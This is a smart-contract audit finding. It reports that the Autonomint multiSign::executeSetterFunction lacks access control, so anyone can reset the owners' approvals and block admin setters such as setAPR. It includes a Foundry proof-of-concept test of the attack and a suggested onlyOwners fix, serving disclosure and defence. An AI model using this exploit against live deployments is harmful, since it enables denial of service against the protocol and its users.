# multiSign::executeSetterFunction will lead to protocol insolvency

### Summary

The `multiSign::executeSetterFunction` will allow anyone to call it and change the state of the mapping `approvedToUpdate` to false for each owner which will deny the owners from calling admin setter functions such as `Borrowing::setAPR`.

[multiSign::executeSetterFunction](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Core_logic/multiSign.sol#L304)

### Root Cause

`multiSign::executeSetterFunction` has no access control and can be called by anyone.

### Internal pre-conditions

- Owners approve a setter function to be called by an admin

### External pre-conditions

None

### Attack Path

1. Owners approve a setter function to be called such as `Borrowing::setAPR`
2. Malicious user calls `multiSign::executeSetterFunction` to set `approvedToUpdate` to false
3. Owner attempts to call `setAPR` but reverts since `approvedToUpdate` is false

### Impact

- Permanent DoS of all admin functions and protocol insolvency since treasury address can not be set if exploited.

### PoC

- Insert the PoC in `borrowing.t.sol`
- Run the test with `forge test --fork-url http://127.0.0.1:8545 --mt testExecuteSetterFunctionCalledByAnyone -vvvv`

```javascript
function testExecuteSetterFunctionCalledByAnyone() public {
        // Owners approve setter function setAPR to update protocol
        vm.startPrank(owner);
        uint8[] memory functions = new uint8[](1);
        functions[0] = uint8(MultiSign.SetterFunctions.SetAPR);
        contractsB.multiSign.approveSetterFunction(functions);
        vm.stopPrank();
        vm.startPrank(owner1);
        functions[0] = uint8(MultiSign.SetterFunctions.SetAPR);
        contractsB.multiSign.approveSetterFunction(functions);
        vm.stopPrank();

        // Malicious user calls executeSetterFunction to set approvedToUpdate to false
        vm.startPrank(USER);
        contractsB.multiSign.executeSetterFunction(MultiSign.SetterFunctions.SetAPR);
        vm.stopPrank();

        // Owner tries to set APR, but reverts since user set approvedToUpdate to false with executeSetterFunction
        vm.startPrank(owner);
        vm.expectRevert();
        contractsB.borrow.setAPR(10,10);
        vm.stopPrank();
    }
```

### Mitigation

Add onlyOwners modifier to `multiSign::executeSetterFunction` to prevent this vulnerability

```diff
function executeSetterFunction(
        SetterFunctions _function
+   ) external onlyOwners (bool) 
```
